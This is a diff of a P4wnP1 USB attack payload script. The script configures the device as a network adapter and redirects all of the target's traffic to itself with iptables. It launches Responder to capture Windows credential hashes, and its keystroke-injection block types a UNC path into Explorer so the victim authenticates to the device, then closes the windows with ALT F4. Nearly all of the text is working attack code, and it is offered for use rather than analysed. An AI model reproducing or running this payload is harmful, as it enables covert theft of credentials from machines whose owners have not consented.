@@ -12,8 +12,8 @@ USB_PID="0x0137"        # Product ID
 USE_ECM=true            # if true CDC ECM will be enabled
 USE_RNDIS=true          # if true RNDIS will be enabled
 USE_HID=true            # if true HID (keyboard) will be enabled
-USE_RAWHID=false         # if true HID (keyboard) will be enabled
-USE_UMS=false 			# if true USB Mass Storage will be enabled
+USE_RAWHID=false        # if true HID (keyboard) will be enabled
+USE_UMS=false           # if true USB Mass Storage will be enabled
 
 # ==========================
 # Network and DHCP options
@@ -21,7 +21,7 @@ USE_UMS=false 			# if true USB Mass Storage will be enabled
 
 # We choose an IP with a very small subnet (see comments in README.rst)
 IF_IP="172.16.0.1" # IP used by P4wnP1
-IF_MASK="255.255.255.252" 
+IF_MASK="255.255.255.252"
 IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang
 
 # =====================
@@ -35,55 +35,57 @@ USE_HID_TEST=false
 # (RNDIS, CDC ECM or both have to be enabled)
 function onNetworkUp()
 {
-	echo "Network up"
-	echo "Active device $active_interface"
-	echo "P4wnP1 IP $IF_IP"
-	echo "P4wnP1 netmask $IF_MASK"
+        echo "Network up"
+        echo "Active device $active_interface"
+        echo "P4wnP1 IP $IF_IP"
+        echo "P4wnP1 netmask $IF_MASK"
 
-    	iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
-	iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
-	echo "Firewall is up to redirect traffic"
+        echo "Firewall is up to redirect traffic"
 
-	#start responder in screen
-    	screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
+        #start responder in screen
+    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
 
-	touch /tmp/responder_started
+        touch /tmp/responder_started
 
-	echo "Network is running"
+        echo "Network is running"
 }
 
 # this function gets called if the target received a DHCP lease
 # (DHCP client has to be running on target)
 function onTargetGotIP()
 {
-	echo "DHCP Lease given to target"
-	echo "Target IP $target_ip"
+        echo "DHCP Lease given to target"
+        echo "Target IP $target_ip"
 
-    	# add route back through target (for ICS)
-    	route add -net default gw $target_ip
+    # add route back through target (for ICS)
+    route add -net default gw $target_ip
 
-	# add DNS entry for google DNS
-	echo nameserver 8.8.8.8 > /etc/resolv.conf
+        # add DNS entry for google DNS
+        echo nameserver 8.8.8.8 > /etc/resolv.conf
 
-	echo "Target got IP $target_ip via DHCP"
+        echo "Target got IP $target_ip via DHCP"
 }
 
 function onKeyboardUp()
 {
     cat <<- EOF | duckhid
-	        DELAY 10000
-	        GUI r
-	        DELAY 500
-			STRING powershell.exe
-			ENTER
-			DELAY 2000
-	#		STRING [console]::WindowHeight=5
-	#		ENTER
-	#		STRING [console]::WindowWidth=5
-	#		ENTER
-			STRING net use \\\appel; exit;
-			ENTER
+                DELAY 10000
+                GUI e
+                DELAY 1000
+                ALT d
+                DELAY 1000
+                STRING \\\appel
+                DELAY 1000
+                ENTER
+                DELAY 10000
+                ALT F4
+                DELAY 1000
+                ALT F4
 EOF
 }
+
+
 
